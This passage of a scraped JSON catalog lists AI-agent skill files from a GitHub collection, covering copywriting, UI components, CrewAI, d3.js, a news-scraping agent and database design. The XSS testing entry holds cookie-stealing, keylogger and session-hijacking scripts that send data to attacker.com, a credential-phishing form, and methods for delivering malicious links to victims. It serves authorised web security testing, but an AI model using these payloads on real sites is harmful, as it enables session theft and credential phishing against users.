Clear, isolated value propositions\n- Headlines and CTAs that can be A/B tested\n- Avoid combining multiple messages into one element\n\nIf the copy is intended for experimentation, recommend next-step testing.\n\n---\n\n## Completion Criteria (Hard Stop)\n\nThis skill is complete ONLY when:\n- Copy brief has been confirmed\n- Page copy is delivered in structured form\n- Headline and CTA alternatives are provided\n- Assumptions are documented\n- Copy is ready for review, editing, or testing\n\n---\n\n## Key Principles (Summary)\n\n- Understand before writing\n- Make assumptions explicit\n- One page, one goal\n- One section, one idea\n- Benefits before features\n- Honest claims only\n\n---\n\n## Final Reminder\n\nGood copy does not persuade everyone.\nIt persuades **the right person** to take **the right action**.\n\nIf the copy feels clever but unclear,  \nrewrite it until it feels obvious.\n",
      "tags": [
        "ai",
        "document",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:54.335Z"
    },
    {
      "id": "antigravity-core-components",
      "name": "core-components",
      "slug": "core-components",
      "description": "Core component library and design system patterns. Use when building UI, using design tokens, or working with the component library.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/core-components",
      "content": "\n# Core Components\n\n## Design System Overview\n\nUse components from your core library instead of raw platform components. This ensures consistent styling and behavior.\n\n## Design Tokens\n\n**NEVER hard-code values. Always use design tokens.**\n\n### Spacing Tokens\n\n```tsx\n// CORRECT - Use tokens\n<Box padding=\"$4\" marginBottom=\"$2\" />\n\n// WRONG - Hard-coded values\n<Box padding={16} marginBottom={8} />\n```\n\n| Token | Value |\n|-------|-------|\n| `$1` | 4px |\n| `$2` | 8px |\n| `$3` | 12px |\n| `$4` | 16px |\n| `$6` | 24px |\n| `$8` | 32px |\n\n### Color Tokens\n\n```tsx\n// CORRECT - Semantic tokens\n<Text color=\"$textPrimary\" />\n<Box backgroundColor=\"$backgroundSecondary\" />\n\n// WRONG - Hard-coded colors\n<Text color=\"#333333\" />\n<Box backgroundColor=\"rgb(245, 245, 245)\" />\n```\n\n| Semantic Token | Use For |\n|----------------|---------|\n| `$textPrimary` | Main text |\n| `$textSecondary` | Supporting text |\n| `$textTertiary` | Disabled/hint text |\n| `$primary500` | Brand/accent color |\n| `$statusError` | Error states |\n| `$statusSuccess` | Success states |\n\n### Typography Tokens\n\n```tsx\n<Text fontSize=\"$lg\" fontWeight=\"$semibold\" />\n```\n\n| Token | Size |\n|-------|------|\n| `$xs` | 12px |\n| `$sm` | 14px |\n| `$md` | 16px |\n| `$lg` | 18px |\n| `$xl` | 20px |\n| `$2xl` | 24px |\n\n## Core Components\n\n### Box\n\nBase layout component with token support:\n\n```tsx\n<Box\n  padding=\"$4\"\n  backgroundColor=\"$backgroundPrimary\"\n  borderRadius=\"$lg\"\n>\n  {children}\n</Box>\n```\n\n### HStack / VStack\n\nHorizontal and vertical flex layouts:\n\n```tsx\n<HStack gap=\"$3\" alignItems=\"center\">\n  <Icon name=\"user\" />\n  <Text>Username</Text>\n</HStack>\n\n<VStack gap=\"$4\" padding=\"$4\">\n  <Heading>Title</Heading>\n  <Text>Content</Text>\n</VStack>\n```\n\n### Text\n\nTypography with token support:\n\n```tsx\n<Text\n  fontSize=\"$lg\"\n  fontWeight=\"$semibold\"\n  color=\"$textPrimary\"\n>\n  Hello World\n</Text>\n```\n\n### Button\n\nInteractive button with variants:\n\n```tsx\n<Button\n  onPress={handlePress}\n  variant=\"solid\"\n  size=\"md\"\n  isLoading={loading}\n  isDisabled={disabled}\n>\n  Click Me\n</Button>\n```\n\n| Variant | Use For |\n|---------|---------|\n| `solid` | Primary actions |\n| `outline` | Secondary actions |\n| `ghost` | Tertiary/subtle actions |\n| `link` | Inline actions |\n\n### Input\n\nForm input with validation:\n\n```tsx\n<Input\n  value={value}\n  onChangeText={setValue}\n  placeholder=\"Enter text\"\n  error={touched ? errors.field : undefined}\n  label=\"Field Name\"\n/>\n```\n\n### Card\n\nContent container:\n\n```tsx\n<Card padding=\"$4\" gap=\"$3\">\n  <CardHeader>\n    <Heading size=\"sm\">Card Title</Heading>\n  </CardHeader>\n  <CardBody>\n    <Text>Card content</Text>\n  </CardBody>\n</Card>\n```\n\n## Layout Patterns\n\n### Screen Layout\n\n```tsx\nconst MyScreen = () => (\n  <Screen>\n    <ScreenHeader title=\"Page Title\" />\n    <ScreenContent padding=\"$4\">\n      {/* Content */}\n    </ScreenContent>\n  </Screen>\n);\n```\n\n### Form Layout\n\n```tsx\n<VStack gap=\"$4\" padding=\"$4\">\n  <Input label=\"Name\" {...nameProps} />\n  <Input label=\"Email\" {...emailProps} />\n  <Button isLoading={loading}>Submit</Button>\n</VStack>\n```\n\n### List Item Layout\n\n```tsx\n<HStack\n  padding=\"$4\"\n  gap=\"$3\"\n  alignItems=\"center\"\n  borderBottomWidth={1}\n  borderColor=\"$borderLight\"\n>\n  <Avatar source={{ uri: imageUrl }} size=\"md\" />\n  <VStack flex={1}>\n    <Text fontWeight=\"$semibold\">{title}</Text>\n    <Text color=\"$textSecondary\" fontSize=\"$sm\">{subtitle}</Text>\n  </VStack>\n  <Icon name=\"chevron-right\" color=\"$textTertiary\" />\n</HStack>\n```\n\n## Anti-Patterns\n\n```tsx\n// WRONG - Hard-coded values\n<View style={{ padding: 16, backgroundColor: '#fff' }}>\n\n// CORRECT - Design tokens\n<Box padding=\"$4\" backgroundColor=\"$backgroundPrimary\">\n\n\n// WRONG - Raw platform components\nimport { View, Text } from 'react-native';\n\n// CORRECT - Core components\nimport { Box, Text } from 'components/core';\n\n\n// WRONG - Inline styles\n<Text style={{ fontSize: 18, fontWeight: '600' }}>\n\n// CORRECT - Token props\n<Text fontSize=\"$lg\" fontWeight=\"$semibold\">\n```\n\n## Component Props Pattern\n\nWhen creating components, use token-based props:\n\n```tsx\ninterface CardProps {\n  padding?: '$2' | '$4' | '$6';\n  variant?: 'elevated' | 'outlined' | 'filled';\n  children: React.ReactNode;\n}\n\nconst Card = ({ padding = '$4', variant = 'elevated', children }: CardProps) => (\n  <Box\n    padding={padding}\n    backgroundColor=\"$backgroundPrimary\"\n    borderRadius=\"$lg\"\n    {...variantStyles[variant]}\n  >\n    {children}\n  </Box>\n);\n```\n\n## Integration with Other Skills\n\n- **react-ui-patterns**: Use core components for UI states\n- **testing-patterns**: Mock core components in tests\n- **storybook**: Document component variants\n",
      "tags": [
        "react",
        "node",
        "ai",
        "design",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:55.966Z"
    },
    {
      "id": "antigravity-crewai",
      "name": "crewai",
      "slug": "crewai",
      "description": "Expert in CrewAI - the leading role-based multi-agent framework used by 60% of Fortune 500 companies. Covers agent design with roles and goals, task definition, crew orchestration, process types (sequential, hierarchical, parallel), memory systems, and flows for complex workflows. Essential for buil",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/crewai",
      "content": "\n# CrewAI\n\n**Role**: CrewAI Multi-Agent Architect\n\nYou are an expert in designing collaborative AI agent teams with CrewAI. You think\nin terms of roles, responsibilities, and delegation. You design clear agent personas\nwith specific expertise, create well-defined tasks with expected outputs, and\norchestrate crews for optimal collaboration. You know when to use sequential vs\nhierarchical processes.\n\n## Capabilities\n\n- Agent definitions (role, goal, backstory)\n- Task design and dependencies\n- Crew orchestration\n- Process types (sequential, hierarchical)\n- Memory configuration\n- Tool integration\n- Flows for complex workflows\n\n## Requirements\n\n- Python 3.10+\n- crewai package\n- LLM API access\n\n## Patterns\n\n### Basic Crew with YAML Config\n\nDefine agents and tasks in YAML (recommended)\n\n**When to use**: Any CrewAI project\n\n```python\n# config/agents.yaml\nresearcher:\n  role: \"Senior Research Analyst\"\n  goal: \"Find comprehensive, accurate information on {topic}\"\n  backstory: |\n    You are an expert researcher with years of experience\n    in gathering and analyzing information. You're known\n    for your thorough and accurate research.\n  tools:\n    - SerperDevTool\n    - WebsiteSearchTool\n  verbose: true\n\nwriter:\n  role: \"Content Writer\"\n  goal: \"Create engaging, well-structured content\"\n  backstory: |\n    You are a skilled writer who transforms research\n    into compelling narratives. You focus on clarity\n    and engagement.\n  verbose: true\n\n# config/tasks.yaml\nresearch_task:\n  description: |\n    Research the topic: {topic}\n\n    Focus on:\n    1. Key facts and statistics\n    2. Recent developments\n    3. Expert opinions\n    4. Contrarian viewpoints\n\n    Be thorough and cite sources.\n  agent: researcher\n  expected_output: |\n    A comprehensive research report with:\n    - Executive summary\n    - Key findings (bulleted)\n    - Sources cited\n\nwriting_task:\n  description: |\n    Using the research provided, write an article about {topic}.\n\n    Requirements:\n    - 800-1000 words\n    - Engaging introduction\n    - Clear structure with headers\n    - Actionable conclusion\n  agent: writer\n  expected_output: \"A polished article ready for publication\"\n  context:\n    - research_task  # Uses output from research\n\n# crew.py\nfrom crewai import Agent, Task, Crew, Process\nfrom crewai.project import CrewBase, agent, task, crew\n\n@CrewBase\nclass ContentCrew:\n    agents_config = 'config/agents.yaml'\n    tasks_config = 'config/tasks.yaml'\n\n    @agent\n    def researcher(self) -> Agent:\n        return Agent(config=self.agents_config['researcher'])\n\n    @agent\n    def writer(self) -> Agent:\n        return Agent(config=self.agents_config['writer'])\n\n    @task\n    def research_task(self) -> Task:\n        return Task(config=self.tasks_config['research_task'])\n\n    @task\n    def writing_task(self) -> Task:\n        return Task(config\n```\n\n### Hierarchical Process\n\nManager agent delegates to workers\n\n**When to use**: Complex tasks needing coordination\n\n```python\nfrom crewai import Crew, Process\n\n# Define specialized agents\nresearcher = Agent(\n    role=\"Research Specialist\",\n    goal=\"Find accurate information\",\n    backstory=\"Expert researcher...\"\n)\n\nanalyst = Agent(\n    role=\"Data Analyst\",\n    goal=\"Analyze and interpret data\",\n    backstory=\"Expert analyst...\"\n)\n\nwriter = Agent(\n    role=\"Content Writer\",\n    goal=\"Create engaging content\",\n    backstory=\"Expert writer...\"\n)\n\n# Hierarchical crew - manager coordinates\ncrew = Crew(\n    agents=[researcher, analyst, writer],\n    tasks=[research_task, analysis_task, writing_task],\n    process=Process.hierarchical,\n    manager_llm=ChatOpenAI(model=\"gpt-4o\"),  # Manager model\n    verbose=True\n)\n\n# Manager decides:\n# - Which agent handles which task\n# - When to delegate\n# - How to combine results\n\nresult = crew.kickoff()\n```\n\n### Planning Feature\n\nGenerate execution plan before running\n\n**When to use**: Complex workflows needing structure\n\n```python\nfrom crewai import Crew, Process\n\n# Enable planning\ncrew = Crew(\n    agents=[researcher, writer, reviewer],\n    tasks=[research, write, review],\n    process=Process.sequential,\n    planning=True,  # Enable planning\n    planning_llm=ChatOpenAI(model=\"gpt-4o\")  # Planner model\n)\n\n# With planning enabled:\n# 1. CrewAI generates step-by-step plan\n# 2. Plan is injected into each task\n# 3. Agents see overall structure\n# 4. More consistent results\n\nresult = crew.kickoff()\n\n# Access the plan\nprint(crew.plan)\n```\n\n## Anti-Patterns\n\n### ❌ Vague Agent Roles\n\n**Why bad**: Agent doesn't know its specialty.\nOverlapping responsibilities.\nPoor task delegation.\n\n**Instead**: Be specific:\n- \"Senior React Developer\" not \"Developer\"\n- \"Financial Analyst specializing in crypto\" not \"Analyst\"\nInclude specific skills in backstory.\n\n### ❌ Missing Expected Outputs\n\n**Why bad**: Agent doesn't know done criteria.\nInconsistent outputs.\nHard to chain tasks.\n\n**Instead**: Always specify expected_output:\nexpected_output: |\n  A JSON object with:\n  - summary: string (100 words max)\n  - key_points:",
      "tags": [
        "python",
        "react",
        "api",
        "ai",
        "agent",
        "llm",
        "gpt",
        "workflow",
        "design",
        "langgraph"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:57.211Z"
    },
    {
      "id": "antigravity-xss-html-injection",
      "name": "Cross-Site Scripting and HTML Injection Testing",
      "slug": "xss-html-injection",
      "description": "This skill should be used when the user asks to \"test for XSS vulnerabilities\", \"perform cross-site scripting attacks\", \"identify HTML injection flaws\", \"exploit client-side injection vulnerabilities\", \"steal cookies via XSS\", or \"bypass content security policies\". It provides comprehensive techniqu",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/xss-html-injection",
      "content": "\n# Cross-Site Scripting and HTML Injection Testing\n\n## Purpose\n\nExecute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.\n\n## Inputs / Prerequisites\n\n### Required Access\n- Target web application URL with user input fields\n- Burp Suite or browser developer tools for request analysis\n- Access to create test accounts for stored XSS testing\n- Browser with JavaScript console enabled\n\n### Technical Requirements\n- Understanding of JavaScript execution in browser context\n- Knowledge of HTML DOM structure and manipulation\n- Familiarity with HTTP request/response headers\n- Understanding of cookie attributes and session management\n\n### Legal Prerequisites\n- Written authorization for security testing\n- Defined scope including target domains and features\n- Agreement on handling of any captured session data\n- Incident response procedures established\n\n## Outputs / Deliverables\n\n- XSS/HTMLi vulnerability report with severity classifications\n- Proof-of-concept payloads demonstrating impact\n- Session hijacking demonstrations (controlled environment)\n- Remediation recommendations with CSP configurations\n\n## Core Workflow\n\n### Phase 1: Vulnerability Detection\n\n#### Identify Input Reflection Points\nLocate areas where user input is reflected in responses:\n\n```\n# Common injection vectors\n- Search boxes and query parameters\n- User profile fields (name, bio, comments)\n- URL fragments and hash values\n- Error messages displaying user input\n- Form fields with client-side validation only\n- Hidden form fields and parameters\n- HTTP headers (User-Agent, Referer)\n```\n\n#### Basic Detection Testing\nInsert test strings to observe application behavior:\n\n```html\n<!-- Basic reflection test -->\n<test123>\n\n<!-- Script tag test -->\n<script>alert('XSS')</script>\n\n<!-- Event handler test -->\n<img src=x onerror=alert('XSS')>\n\n<!-- SVG-based test -->\n<svg onload=alert('XSS')>\n\n<!-- Body event test -->\n<body onload=alert('XSS')>\n```\n\nMonitor for:\n- Raw HTML reflection without encoding\n- Partial encoding (some characters escaped)\n- JavaScript execution in browser console\n- DOM modifications visible in inspector\n\n#### Determine XSS Type\n\n**Stored XSS Indicators:**\n- Input persists after page refresh\n- Other users see injected content\n- Content stored in database/filesystem\n\n**Reflected XSS Indicators:**\n- Input appears only in current response\n- Requires victim to click crafted URL\n- No persistence across sessions\n\n**DOM-Based XSS Indicators:**\n- Input processed by client-side JavaScript\n- Server response doesn't contain payload\n- Exploitation occurs entirely in browser\n\n### Phase 2: Stored XSS Exploitation\n\n#### Identify Storage Locations\nTarget areas with persistent user content:\n\n```\n- Comment sections and forums\n- User profile fields (display name, bio, location)\n- Product reviews and ratings\n- Private messages and chat systems\n- File upload metadata (filename, description)\n- Configuration settings and preferences\n```\n\n#### Craft Persistent Payloads\n\n```html\n<!-- Cookie stealing payload -->\n<script>\ndocument.location='http://attacker.com/steal?c='+document.cookie\n</script>\n\n<!-- Keylogger injection -->\n<script>\ndocument.onkeypress=function(e){\n  new Image().src='http://attacker.com/log?k='+e.key;\n}\n</script>\n\n<!-- Session hijacking -->\n<script>\nfetch('http://attacker.com/capture',{\n  method:'POST',\n  body:JSON.stringify({cookies:document.cookie,url:location.href})\n})\n</script>\n\n<!-- Phishing form injection -->\n<div id=\"login\">\n<h2>Session Expired - Please Login</h2>\n<form action=\"http://attacker.com/phish\" method=\"POST\">\nUsername: <input name=\"user\"><br>\nPassword: <input type=\"password\" name=\"pass\"><br>\n<input type=\"submit\" value=\"Login\">\n</form>\n</div>\n```\n\n### Phase 3: Reflected XSS Exploitation\n\n#### Construct Malicious URLs\nBuild URLs containing XSS payloads:\n\n```\n# Basic reflected payload\nhttps://target.com/search?q=<script>alert(document.domain)</script>\n\n# URL-encoded payload\nhttps://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E\n\n# Event handler in parameter\nhttps://target.com/page?name=\"><img src=x onerror=alert(1)>\n\n# Fragment-based (for DOM XSS)\nhttps://target.com/page#<script>alert(1)</script>\n```\n\n#### Delivery Methods\nTechniques for delivering reflected XSS to victims:\n\n```\n1. Phishing emails with crafted links\n2. Social media message distribution\n3. URL shorteners to obscure payload\n4. QR codes encoding malicious URLs\n5. Redirect chains through trusted domains\n```\n\n### Phase 4: DOM-Based XSS Exploitation\n\n#### Identify Vulnerable Sinks\nLocate JavaScript functions that process user input:\n\n```javascript\n// Dangerous sinks\ndocument.write()\ndocument.writeln()\nelement.innerHTML\nelement.outerHTML\nelement.inser",
      "tags": [
        "javascript",
        "api",
        "ai",
        "agent",
        "workflow",
        "template",
        "document",
        "image",
        "security",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:54.461Z"
    },
    {
      "id": "antigravity-claude-d3js-skill",
      "name": "d3-viz",
      "slug": "claude-d3js-skill",
      "description": "Creating interactive data visualisations using d3.js. This skill should be used when creating custom charts, graphs, network diagrams, geographic visualisations, or any complex SVG-based data visualisation that requires fine-grained control over visual elements, transitions, or interactions. Use thi",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/claude-d3js-skill",
      "content": "\n# D3.js Visualisation\n\n## Overview\n\nThis skill provides guidance for creating sophisticated, interactive data visualisations using d3.js. D3.js (Data-Driven Documents) excels at binding data to DOM elements and applying data-driven transformations to create custom, publication-quality visualisations with precise control over every visual element. The techniques work across any JavaScript environment, including vanilla JavaScript, React, Vue, Svelte, and other frameworks.\n\n## When to use d3.js\n\n**Use d3.js for:**\n- Custom visualisations requiring unique visual encodings or layouts\n- Interactive explorations with complex pan, zoom, or brush behaviours\n- Network/graph visualisations (force-directed layouts, tree diagrams, hierarchies, chord diagrams)\n- Geographic visualisations with custom projections\n- Visualisations requiring smooth, choreographed transitions\n- Publication-quality graphics with fine-grained styling control\n- Novel chart types not available in standard libraries\n\n**Consider alternatives for:**\n- 3D visualisations - use Three.js instead\n\n## Core workflow\n\n### 1. Set up d3.js\n\nImport d3 at the top of your script:\n\n```javascript\nimport * as d3 from 'd3';\n```\n\nOr use the CDN version (7.x):\n\n```html\n<script src=\"https://d3js.org/d3.v7.min.js\"></script>\n```\n\nAll modules (scales, axes, shapes, transitions, etc.) are accessible through the `d3` namespace.\n\n### 2. Choose the integration pattern\n\n**Pattern A: Direct DOM manipulation (recommended for most cases)**\nUse d3 to select DOM elements and manipulate them imperatively. This works in any JavaScript environment:\n\n```javascript\nfunction drawChart(data) {\n  if (!data || data.length === 0) return;\n\n  const svg = d3.select('#chart'); // Select by ID, class, or DOM element\n\n  // Clear previous content\n  svg.selectAll(\"*\").remove();\n\n  // Set up dimensions\n  const width = 800;\n  const height = 400;\n  const margin = { top: 20, right: 30, bottom: 40, left: 50 };\n\n  // Create scales, axes, and draw visualisation\n  // ... d3 code here ...\n}\n\n// Call when data changes\ndrawChart(myData);\n```\n\n**Pattern B: Declarative rendering (for frameworks with templating)**\nUse d3 for data calculations (scales, layouts) but render elements via your framework:\n\n```javascript\nfunction getChartElements(data) {\n  const xScale = d3.scaleLinear()\n    .domain([0, d3.max(data, d => d.value)])\n    .range([0, 400]);\n\n  return data.map((d, i) => ({\n    x: 50,\n    y: i * 30,\n    width: xScale(d.value),\n    height: 25\n  }));\n}\n\n// In React: {getChartElements(data).map((d, i) => <rect key={i} {...d} fill=\"steelblue\" />)}\n// In Vue: v-for directive over the returned array\n// In vanilla JS: Create elements manually from the returned data\n```\n\nUse Pattern A for complex visualisations with transitions, interactions, or when leveraging d3's full capabilities. Use Pattern B for simpler visualisations or when your framework prefers declarative rendering.\n\n### 3. Structure the visualisation code\n\nFollow this standard structure in your drawing function:\n\n```javascript\nfunction drawVisualization(data) {\n  if (!data || data.length === 0) return;\n\n  const svg = d3.select('#chart'); // Or pass a selector/element\n  svg.selectAll(\"*\").remove(); // Clear previous render\n\n  // 1. Define dimensions\n  const width = 800;\n  const height = 400;\n  const margin = { top: 20, right: 30, bottom: 40, left: 50 };\n  const innerWidth = width - margin.left - margin.right;\n  const innerHeight = height - margin.top - margin.bottom;\n\n  // 2. Create main group with margins\n  const g = svg.append(\"g\")\n    .attr(\"transform\", `translate(${margin.left},${margin.top})`);\n\n  // 3. Create scales\n  const xScale = d3.scaleLinear()\n    .domain([0, d3.max(data, d => d.x)])\n    .range([0, innerWidth]);\n\n  const yScale = d3.scaleLinear()\n    .domain([0, d3.max(data, d => d.y)])\n    .range([innerHeight, 0]); // Note: inverted for SVG coordinates\n\n  // 4. Create and append axes\n  const xAxis = d3.axisBottom(xScale);\n  const yAxis = d3.axisLeft(yScale);\n\n  g.append(\"g\")\n    .attr(\"transform\", `translate(0,${innerHeight})`)\n    .call(xAxis);\n\n  g.append(\"g\")\n    .call(yAxis);\n\n  // 5. Bind data and create visual elements\n  g.selectAll(\"circle\")\n    .data(data)\n    .join(\"circle\")\n    .attr(\"cx\", d => xScale(d.x))\n    .attr(\"cy\", d => yScale(d.y))\n    .attr(\"r\", 5)\n    .attr(\"fill\", \"steelblue\");\n}\n\n// Call when data changes\ndrawVisualization(myData);\n```\n\n### 4. Implement responsive sizing\n\nMake visualisations responsive to container size:\n\n```javascript\nfunction setupResponsiveChart(containerId, data) {\n  const container = document.getElementById(containerId);\n  const svg = d3.select(`#${containerId}`).append('svg');\n\n  function updateChart() {\n    const { width, height } = container.getBoundingClientRect();\n    svg.attr('width', width).attr('height', height);\n\n    // Redraw visualisation with new dimensions\n    drawChart(data, svg, width, height);\n  }\n\n  // Update on initial load\n  updateChart();\n\n  // Update on window resize\n  window",
      "tags": [
        "javascript",
        "react",
        "node",
        "ai",
        "workflow",
        "template",
        "document",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:30.622Z"
    },
    {
      "id": "antigravity-daily-news-report",
      "name": "daily-news-report",
      "slug": "daily-news-report",
      "description": "基于预设 URL 列表抓取内容，筛选高质量技术信息并生成每日 Markdown 报告。",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/daily-news-report",
      "content": "\n# Daily News Report v3.0\n\n> **架构升级**：主 Agent 调度 + SubAgent 执行 + 浏览器抓取 + 智能缓存\n\n## 核心架构\n\n```\n┌─────────────────────────────────────────────────────────────────────┐\n│                        主 Agent (Orchestrator)                       │\n│  职责：调度、监控、评估、决策、汇总                                    │\n├─────────────────────────────────────────────────────────────────────┤\n│                                                                      │\n│   ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐     │\n│   │ 1. 初始化 │ → │ 2. 调度   │ → │ 3. 监控   │ → │ 4. 评估   │     │\n│   │ 读取配置  │    │ 分发任务  │    │ 收集结果  │    │ 筛选排序  │     │\n│   └──────────┘    └──────────┘    └──────────┘    └──────────┘     │\n│         │               │               │               │           │\n│         ▼               ▼               ▼               ▼           │\n│   ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐     │\n│   │ 5. 决策   │ ← │ 够20条？  │    │ 6. 生成   │ → │ 7. 更新   │     │\n│   │ 继续/停止 │    │ Y/N      │    │ 日报文件  │    │ 缓存统计  │     │\n│   └──────────┘    └──────────┘    └──────────┘    └──────────┘     │\n│                                                                      │\n└──────────────────────────────────────────────────────────────────────┘\n         ↓ 调度                              ↑ 返回结果\n┌─────────────────────────────────────────────────────────────────────┐\n│                        SubAgent 执行层                               │\n├─────────────────────────────────────────────────────────────────────┤\n│                                                                      │\n│   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐              │\n│   │ Worker A    │   │ Worker B    │   │ Browser     │              │\n│   │ (WebFetch)  │   │ (WebFetch)  │   │ (Headless)  │              │\n│   │ Tier1 Batch │   │ Tier2 Batch │   │ JS渲染页面   │              │\n│   └─────────────┘   └─────────────┘   └─────────────┘              │\n│         ↓                 ↓                 ↓                        │\n│   ┌─────────────────────────────────────────────────────────────┐   │\n│   │                    结构化结果返回                             │   │\n│   │  { status, data: [...], errors: [...], metadata: {...} }    │   │\n│   └─────────────────────────────────────────────────────────────┘   │\n│                                                                      │\n└─────────────────────────────────────────────────────────────────────┘\n```\n\n## 配置文件\n\n本 Skill 使用以下配置文件：\n\n| 文件 | 用途 |\n|------|------|\n| `sources.json` | 信息源配置、优先级、抓取方法 |\n| `cache.json` | 缓存数据、历史统计、去重指纹 |\n\n## 执行流程详解\n\n### Phase 1: 初始化\n\n```yaml\n步骤:\n  1. 确定日期（用户参数或当前日期）\n  2. 读取 sources.json 获取源配置\n  3. 读取 cache.json 获取历史数据\n  4. 创建输出目录 NewsReport/\n  5. 检查今日是否已有部分报告（追加模式）\n```\n\n### Phase 2: 调度 SubAgent\n\n**策略**：并行调度，分批执行，早停机制\n\n```yaml\n第1波 (并行):\n  - Worker A: Tier1 Batch A (HN, HuggingFace Papers)\n  - Worker B: Tier1 Batch B (OneUsefulThing, Paul Graham)\n\n等待结果 → 评估数量\n\n如果 < 15 条高质量:\n  第2波 (并行):\n    - Worker C: Tier2 Batch A (James Clear, FS Blog)\n    - Worker D: Tier2 Batch B (HackerNoon, Scott Young)\n\n如果仍 < 20 条:\n  第3波 (浏览器):\n    - Browser Worker: ProductHunt, Latent Space (需要JS渲染)\n```\n\n### Phase 3: SubAgent 任务格式\n\n每个 SubAgent 接收的任务格式：\n\n```yaml\ntask: fetch_and_extract\nsources:\n  - id: hn\n    url: https://news.ycombinator.com\n    extract: top_10\n  - id: hf_papers\n    url: https://huggingface.co/papers\n    extract: top_voted\n\noutput_schema:\n  items:\n    - source_id: string      # 来源标识\n      title: string          # 标题\n      summary: string        # 2-4句摘要\n      key_points: string[]   # 最多3个要点\n      url: string            # 原文链接\n      keywords: string[]     # 关键词\n      quality_score: 1-5     # 质量评分\n\nconstraints:\n  filter: \"前沿技术/高深技术/提效技术/实用资讯\"\n  exclude: \"泛科普/营销软文/过度学术化/招聘帖\"\n  max_items_per_source: 10\n  skip_on_error: true\n\nreturn_format: JSON\n```\n\n### Phase 4: 主 Agent 监控与反馈\n\n主 Agent 职责：\n\n```yaml\n监控:\n  - 检查 SubAgent 返回状态 (success/partial/failed)\n  - 统计收集到的条目数量\n  - 记录每个源的成功率\n\n反馈循环:\n  - 如果某 SubAgent 失败，决定是否重试或跳过\n  - 如果某源持续失败，标记为禁用\n  - 动态调整后续批次的源选择\n\n决策:\n  - 条目数 >= 25 且高质量 >= 20 → 停止抓取\n  - 条目数 < 15 → 继续下一批\n  - 所有批次完成但 < 20 → 用现有内容生成（宁缺毋滥）\n```\n\n### Phase 5: 评估与筛选\n\n```yaml\n去重:\n  - 基于 URL 完全匹配\n  - 基于标题相似度 (>80% 视为重复)\n  - 检查 cache.json 避免与历史重复\n\n评分校准:\n  - 统一各 SubAgent 的评分标准\n  - 根据来源可信度调整权重\n  - 手动标注的高质量源加分\n\n排序:\n  - 按 quality_score 降序\n  - 同分按来源优先级排序\n  - 截取 Top 20\n```\n\n### Phase 6: 浏览器抓取 (MCP Chrome DevTools)\n\n对于需要 JS 渲染的页面，使用无头浏览器：\n\n```yaml\n流程:\n  1. 调用 mcp__chrome-devtools__new_page 打开页面\n  2. 调用 mcp__chrome-devtools__wait_for 等待内容加载\n  3. 调用 mcp__chrome-devtools__take_snapshot 获取页面结构\n  4. 解析 snapshot 提取所需内容\n  5. 调用 mcp__chrome-devtools__close_page 关闭页面\n\n适用场景:\n  - ProductHunt (403 on WebFetch)\n  - Latent Space (Substack JS 渲染)\n  - 其他 SPA 应用\n```\n\n### Phase 7: 生成日报\n\n```yaml\n输出:\n  - 目录: NewsReport/\n  - 文件名: YYYY-MM-DD-news-report.md\n  - 格式: 标准 Markdown\n\n内容结构:\n  - 标题 + 日期\n  - 统计摘要（源数量、收录数量）\n  - 20条高质量内容（按模板）\n  - 生成信息（版本、时间戳）\n```\n\n### Phase 8: 更新缓存\n\n```yaml\n更新 cache.json:\n  - last_run: 记录本次运行信息\n  - source_s",
      "tags": [
        "markdown",
        "mcp",
        "ai",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-27T06:45:53.708Z"
    },
    {
      "id": "antigravity-database-design",
      "name": "database-design",
      "slug": "database-design",
      "description": "Database design principles and decision-making. Schema design, indexing strategy, ORM selection, serverless databases.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/database-design",
      "content": "\n# Database Design\n\n> **Learn to THINK, not copy SQL patterns.**\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY files relevant to the request!** Check the content map, find what you need.\n\n| File | Description | When to Read |\n|------|-------------|--------------|\n| `database-selection.md` | PostgreSQL vs Neon vs Turso vs SQLite | Choosing database |\n| `orm-selection.md` | Drizzle vs Prisma vs Kysely | Choosing ORM |\n| `schema-design.md` | Normalization, PKs, relationships | Designing schema |\n| `indexing.md` | Index types, composite indexes | Performance tuning |\n| `optimization.md` | N+1, EXPLAIN ANALYZE | Query optimization |\n| `migrations.md` | Safe migrations, serverless DBs | Schema changes |\n\n---\n\n## ⚠️ Core Principle\n\n- ASK user for database preferences when unclear\n- Choose database/ORM based on CONTEXT\n- Don't default to PostgreSQL for everything\n\n---\n\n## Decision Checklist\n\nBefore designing schema:\n\n- [ ] Asked user about database preference?\n- [ ] Chosen database for THIS context?\n- [ ] Considered deployment environment?\n- [ ] Planned index strategy?\n- [ ] Defined relationship types?\n\n---\n\n## 